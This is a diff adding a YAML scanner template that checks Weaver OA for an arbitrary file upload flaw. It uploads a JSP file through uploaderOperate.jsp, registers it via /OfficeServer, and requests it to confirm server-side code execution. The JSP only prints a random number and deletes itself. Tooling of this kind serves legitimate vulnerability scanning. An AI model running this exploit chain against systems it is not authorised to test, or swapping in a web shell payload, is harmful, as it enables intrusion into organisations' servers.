@@ -1,0 +1,31 @@
+name: weaver-oa-workrelate-file-upload
+set:
+  s2: randomInt(10000000, 90000000)
+  s1: randomLowercase(20)
+rules:
+  - method: POST
+    path: "/workrelate/plan/util/uploaderOperate.jsp"
+    headers:
+      Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryVdb2RRl25PuaGhWj
+    body: 
+      "------WebKitFormBoundaryVdb2RRl25PuaGhWj\r\nContent-Disposition: form-data; name=\"secId\"\r\n\r\n1\r\n------WebKitFormBoundaryVdb2RRl25PuaGhWj\r\nContent-Disposition: form-data; name=\"Filedata\"; filename=\"{{s1}}.jsp\"\r\n\r\n<% out.println(\"{{s2}}\"); new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>\r\n------WebKitFormBoundaryVdb2RRl25PuaGhWj\r\nContent-Disposition: form-data; name=\"plandetailid\"\r\n\r\n1\r\n------WebKitFormBoundaryVdb2RRl25PuaGhWj--"
+    expression: |
+      response.status == 200 && response.body.bcontains(b"fileid")
+    output:
+      search: '"fileid=(?P<id1>.+?)>".bsubmatch(response.body)'
+      id1: search["id1"]
+      id: replaceAll(string(id1), "'", "")
+  - method: POST
+    path: "/OfficeServer"
+    headers:
+      Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryVdb2RRl25PuaGhWj
+    body: 
+      "------WebKitFormBoundaryVdb2RRl25PuaGhWj\r\nContent-Disposition: form-data; name=\"aaa\"\r\n\r\n{\"OPTION\":\"INSERTIMAGE\",\"isInsertImageNew\":\"1\",\"imagefileid4pic\":\"{{id}}\"}\r\n------WebKitFormBoundaryVdb2RRl25PuaGhWj--"
+    expression: |
+      response.status == 200 && response.body.bcontains(bytes(string(s2)))
+  - method: GET
+    path: "/{{s1}}.jsp"
+    expression: |
+      response.status == 200 && response.body.bcontains(bytes(string(s2)))
+detail:
+  author: 666
